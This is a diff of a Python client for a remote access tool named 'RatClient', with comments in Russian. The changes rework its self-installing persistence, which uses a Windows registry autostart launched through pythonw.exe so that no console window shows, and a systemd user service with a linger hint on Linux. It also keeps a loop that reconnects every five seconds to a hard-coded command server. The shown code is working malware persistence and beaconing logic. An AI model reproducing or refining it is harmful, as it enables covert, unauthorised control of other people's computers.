@@ -27,7 +27,7 @@ def add_to_autostart_windows():
     try:
         exe_path = sys.executable
         script_path = os.path.abspath(__file__)
-        # Команда запуска: pythonw.exe client.py (pythonw убирает окно консоли)
+        # Используем pythonw.exe, если есть, чтобы не показывалось окно консоли
         if exe_path.lower().endswith("python.exe"):
             pythonw_path = exe_path[:-4] + "w.exe"
             if os.path.exists(pythonw_path):
@@ -56,7 +56,7 @@ def is_in_autostart_windows():
                             0, winreg.KEY_READ)
         i = 0
         while True:
-            name, value, _ = winreg.EnumValue(key, i)
+            name, _, _ = winreg.EnumValue(key, i)
             if name == "RatClient":
                 return True
             i += 1
@@ -65,9 +65,8 @@ def is_in_autostart_windows():
 
 def add_to_autostart_linux():
     """
-    Добавляем systemd user-сервис:
-    Создаем файл ~/.config/systemd/user/ratclient.service
-    и запускаем его.
+    Создаёт systemd юзер-сервис в ~/.config/systemd/user/ratclient.service
+    и активирует его.
     """
     home = os.path.expanduser("~")
     systemd_dir = os.path.join(home, ".config", "systemd", "user")
@@ -81,7 +80,7 @@ def add_to_autostart_linux():
 
     service_content = f"""[Unit]
 Description=Rat Client Service
-After=network.target
+After=network-online.target
 
 [Service]
 ExecStart={python_path} {script_path}
@@ -92,28 +91,30 @@ RestartSec=5
 WantedBy=default.target
 """
 
+    # Если сервис уже есть и не нужно менять — пропускаем
     if os.path.exists(service_path):
-        # Проверим совпадает ли содержимое – чтобы не перезаписывать постоянно
         with open(service_path, "r", encoding="utf-8") as f:
             existing = f.read()
         if existing == service_content:
-            return True, f"Сервис systemd уже установлен: {service_path}"
+            return True, f"systemd сервис уже установлен: {service_path}"
 
+    # Записываем сервис
     try:
         with open(service_path, "w", encoding="utf-8") as f:
             f.write(service_content)
     except Exception as e:
-        return False, f"Ошибка записи systemd unit файла: {e}"
+        return False, f"Ошибка записи файла systemd unit: {e}"
 
-    # Активируем сервис
+    # Перезагружаем systemd и включаем сервис
     try:
         subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
         subprocess.run(["systemctl", "--user", "enable", "ratclient.service"], check=True)
+        # Запускаем сервис, если не запущен
         subprocess.run(["systemctl", "--user", "start", "ratclient.service"], check=True)
     except Exception as e:
-        return False, f"Ошибка при запуске systemd сервиса: {e}"
+        return False, f"Ошибка в systemctl: {e}"
 
-    return True, f"Сервис systemd установлен и запущен: {service_path}"
+    return True, f"systemd сервис установлен и запущен: {service_path}"
 
 def is_in_autostart_linux():
     home = os.path.expanduser("~")
@@ -126,16 +127,19 @@ def add_self_to_autostart():
             success, msg = add_to_autostart_windows()
             print(msg)
         else:
-            print("Уже добавлен в автозагрузку Windows")
+            print("Уже добавлен в автозапуск Windows")
     else:
         if not is_in_autostart_linux():
             success, msg = add_to_autostart_linux()
             print(msg)
+            # Для служб пользователя возможно нужно включить linger:
+            # Подсказка пользователю вручную:
+            print("Если сервис не стартует после перезагрузки, выполните в терминале:")
+            print("sudo loginctl enable-linger $USER")
         else:
-            print("Уже добавлен в systemd автозагрузку")
+            print("Уже добавлен в systemd автозапуск")
 
 def main():
-    # Добавляем автозапуск при старте
     try:
         add_self_to_autostart()
     except Exception as e:
@@ -146,7 +150,6 @@ def main():
         try:
             s.connect((SERVER_IP, SERVER_PORT))
         except Exception:
-            # если не получилось подключиться, ждем и повторяем
             time.sleep(5)
             continue
 
@@ -197,7 +200,6 @@ def main():
             pass
         finally:
             s.close()
-        # при разрыве ждем и переподключаемся заново
         time.sleep(5)
 
 if __name__ == "__main__":
